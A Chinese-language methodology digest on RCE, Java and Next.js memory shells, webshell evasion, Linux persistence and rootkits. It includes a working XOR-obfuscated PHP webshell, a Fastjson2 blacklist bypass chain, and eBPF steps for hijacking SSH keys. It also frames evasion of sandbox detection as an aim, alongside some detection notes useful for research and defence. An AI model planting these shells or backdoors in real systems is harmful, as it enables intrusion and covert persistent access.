# RCE/持久化安全研究方法论

## 元思考框架

### 攻击链思维模型

```
┌─────────────────────────────────────────────────────────────────┐
│                     攻击链思维模型                                │
├─────────────────────────────────────────────────────────────────┤
│  入口点发现 → 漏洞触发 → 代码执行 → 权限维持 → 隐蔽驻留          │
│      ↓           ↓           ↓           ↓           ↓          │
│  信息收集     RCE触发     命令执行     持久化     免杀对抗        │
│  资产测绘     链式利用     内存马       后门      流量混淆        │
└─────────────────────────────────────────────────────────────────┘
```

### 三层对抗模型

| 层次 | 攻击者视角 | 防御者视角 | 核心矛盾点 |
|------|-----------|-----------|-----------|
| **代码层** | 构造恶意载荷绕过检测 | 静态特征码匹配 | 特征变形 vs 签名更新 |
| **行为层** | 无文件/内存驻留 | 行为监控/RASP | 执行路径隐藏 vs 调用链追踪 |
| **内核层** | Rootkit/eBPF后门 | 完整性校验 | 内核空间 vs 用户空间信任边界 |

---

## RCE触发点识别矩阵

### Java生态

| 漏洞类型 | 触发点特征 | 代表性漏洞 | 核心利用原理 |
|---------|-----------|-----------|-------------|
| **反序列化** | `readObject()`/`ObjectInputStream` | CC链、Fastjson | 恶意对象在反序列化时触发getter/setter |
| **JNDI注入** | `lookup()`可控 | Log4j2 CVE-2021-44228 | 远程类加载+工厂类实例化 |
| **表达式注入** | OGNL/SpEL/MVEL解析器 | Struts2、Spring CVE | 表达式引擎的动态求值能力 |
| **模板注入(SSTI)** | Thymeleaf/FreeMarker | 若依 SSTI | 预处理阶段的表达式执行 |

### Fastjson2 RCE绕过（双代理链）

```
攻击链路径：
JSONObject.toString()
  → getters()遍历
    → [黑名单检测: TemplatesImpl被拦截]
      → 绕过：JdkDynamicAopProxy代理
        → Templates接口不在黑名单
          → invoke()委托给真实对象
            → TemplatesImpl.getOutputProperties()
              → 恶意字节码加载 → RCE

关键绕过原理：检测逻辑只校验代理接口，不检查被代理的真实对象
```

### Node.js/前端生态

| 漏洞类型 | 触发点特征 | 典型案例 |
|---------|-----------|---------|
| **原型链污染** | `__proto__`属性赋值 | Next.js Server Actions |
| **命令注入** | `child_process.exec()` | 任意命令执行 |

---

## 内存马类型与注入原理

### Java内存马分类体系

```
                    Java内存马技术栈
                          │
        ┌─────────────────┼─────────────────┐
        │                 │                 │
   Web组件型           框架型            Agent型
        │                 │                 │
  ┌─────┼─────┐     ┌─────┼─────┐    ┌─────┼─────┐
  │     │     │     │     │     │    │     │     │
Servlet Filter Listener Controller Interceptor redefine retransform
```

### 组件生命周期决定注入策略

| 组件类型 | 加载时机 | 注入策略 | 技术实现 |
|---------|---------|---------|---------|
| **Servlet** | 懒加载（首次访问时） | 修改实例化数据即可 | `StandardContext.addChild()` |
| **Filter** | 启动时立即实例化 | 需自己实例化并重新触发注册 | `filterDef` + `filterStart()` |
| **Listener** | 启动时实例化+事件驱动 | 注入实例到监听器列表 | `addApplicationEventListener()` |

### 获取StandardContext

```java
HttpServletRequest.getServletContext()
    → context (ApplicationContext)
        → context (StandardContext) // 反射获取
```

### Agent内存马攻防博弈

```
                      JvmtiEnv链结构
                           │
    ┌──────────────────────┼──────────────────────┐
    │                      │                      │
no-retransformable     retransformable       攻击者注入
    jvmti链                jvmti链              的jvmti
    │                      │                      │
 普通transformer      canRetransform=true    最后执行位置
    │                      │                      │
  先执行               后执行                决定隐蔽性
```

**核心发现**：
- 链末尾位置决定检测可见性
- "借尸还魂"技术：复用已存在的JvmtiEnv，无需新注入Agent
- 保证自己始终在链末尾，修改后自我卸载

### Next.js内存马（原型污染）

```javascript
// Header隐蔽路由（不依赖固定URL）
Accept: image/webp,*/*
Accept-Encoding: gzip, deflate, br, gzipp  // 'gzipp'为识别标记

// 技术创新点：
// 1. 修改http.Server.prototype.emit全局拦截请求
// 2. 日志中看起来像正常图片请求
// 3. WAF难以基于路径规则拦截
```

---

## Webshell免杀技术栈

### JSP免杀

| 技术 | 原理 | 示例 |
|-----|------|-----|
| **编码绕过** | 使用非标准编码 | `pageEncoding="Cp037"` (IBM EBCDIC) |
| **trimDirectiveWhitespaces** | 控制换行影响生成的Java代码结构 | 代码拼接成单行 |
| **特殊闭合** | 类SQL注入的闭合技巧 | 闭合`out.write()`构造可执行代码 |

### PHP免杀（异或+变量函数）

```php
<?php
$_=('%01'^'`').('%13'^'`').('%07'^'`').('%05'^'`').('%20'^'`');  // _GET
@${$_}[_](${$_}[__]);  // 等价于 $_GET[_]($_GET[__])
```

### 多层次免杀技术矩阵

```
┌─────────────────────────────────────────────────────────────┐
│                    免杀技术层次模型                           │
├─────────────────────────────────────────────────────────────┤
│ 指令级 │ 指令等价替换、寄存器重分配                           │
├────────┼────────────────────────────────────────────────────┤
│ 结构级 │ 指令序列重组、控制流平坦化                           │
├────────┼────────────────────────────────────────────────────┤
│ 数据级 │ 多算法字符串加密（XOR/AES/Base64轮换）              │
├────────┼────────────────────────────────────────────────────┤
│ 噪音级 │ 智能垃圾指令插入、死代码注入                         │
├────────┼────────────────────────────────────────────────────┤
│ 策略级 │ 策略组合引擎、动态变异、多态生成                     │
└────────┴────────────────────────────────────────────────────┘
```

### 控制流平坦化

```
原始控制流:          平坦化后:
    ↓                   ↓
  func1()          ┌─ dispatcher ─┐
    ↓              │   switch(state)  │
  func2()          │  case 1: func1() │
    ↓              │  case 2: func2() │
  func3()          │  case 3: func3() │
                   └──────────────────┘

效果：绕过微步、360云沙箱等检测
```

---

## 持久化决策矩阵

### Linux持久化技术

| 技术 | 隐蔽性 | 持久性 | 检测方法 |
|-----|-------|-------|---------|
| **添加root用户** | 低 | 高 | 检查/etc/passwd |
| **SSH公钥注入** | 中 | 高 | 检查authorized_keys |
| **计划任务** | 低 | 高 | crontab -l |
| **LD_PRELOAD劫持** | 高 | 高 | strace检查预加载文件 |
| **内核模块Rootkit** | 极高 | 极高 | unhide工具 |
| **eBPF后门** | 极高 | 高 | 需要内核级检测 |

### eBPF后门技术（SSH密钥劫持）

```
攻击流程:
1. Hook read系统调用入口(sys_enter_read)
2. 记录进程名为sshd的read调用参数
3. 在read返回时(sys_exit_read)检查buffer内容
4. 如果包含"ssh-rsa"，替换为攻击者公钥
5. 实现免密登录后门

技术优势：
- 运行在内核沙箱中，稳定安全
- 无文件落地，难以检测
- 需要较高版本内核支持
```

### 持久化选择决策树

```
                    目标环境
                       │
         ┌─────────────┼─────────────┐
         │             │             │
      Windows        Linux        容器
         │             │             │
    ┌────┼────┐   ┌────┼────┐   ┌────┼────┐
    │    │    │   │    │    │   │    │    │
  域环境 单机 云  内核高 内核低  K8s Docker
    │    │    │   │    │    │   │    │
   DCSync 注册表 RDP后门 eBPF SSH后门 挂载卷 镜像投毒
  委派攻击 服务  IAM    模块  定时任务 sidecar
```

---

## Rootkit技术层次

| 层次 | 技术 | 隐蔽能力 | 开发难度 |
|-----|------|---------|---------|
| **用户态** | LD_PRELOAD Hook | 中 | 低 |
| **系统调用** | ptrace注入、syscall Hook | 高 | 中 |
| **内核模块** | LKM Rootkit (Diamorphine) | 极高 | 高 |
| **eBPF** | BCC/libbpf Hook | 极高 | 中 |
| **固件级** | UEFI Rootkit | 最高 | 极高 |

### LD_PRELOAD劫持检测

```bash
# 常规检测
strace -f /bin/ls 2>&1 | grep preload

# 对抗方法：使用busybox（静态编译，不受劫持影响）
./busybox ls
```

---

## 核心规律提炼

### 规律一：复杂度即机会
- 功能越多，攻击面越大
- 解析器/引擎是RCE高发区

### 规律二：时序决定可见性
- 先加载的检测后加载的修改
- 内存马检测的本质是时序竞争

### 规律三：抽象层越高，防御越难
- 内核态对用户态天然不可见
- eBPF/Rootkit难以用常规手段检测

### 规律四：特征变形vs行为本质
- 静态特征可无限变形
- 行为才是恶意软件的本质
- 最终防御应基于行为而非签名

---

## 代表性案例索引

| 文档编号 | 主题 | 核心技术点 |
|---------|------|-----------|
| **90691** | 传统Web内存马 | Servlet/Filter/Listener生命周期 |
| **12556** | Agent内存马攻防 | JvmtiEnv链、借尸还魂 |
| **90788** | Next.js内存马 | 原型污染+HTTP劫持 |
| **18941** | JSP免杀 | 解析流程漏洞利用编码差异 |
| **90717** | 特征码免杀 | 控制流平坦化 |
| **12135** | eBPF后门 | SSH密钥劫持 |
| **90711** | Fastjson2 RCE | 双代理链绕过黑名单 |
| **90768** | 若依SSTI | Thymeleaf预处理绕过 |
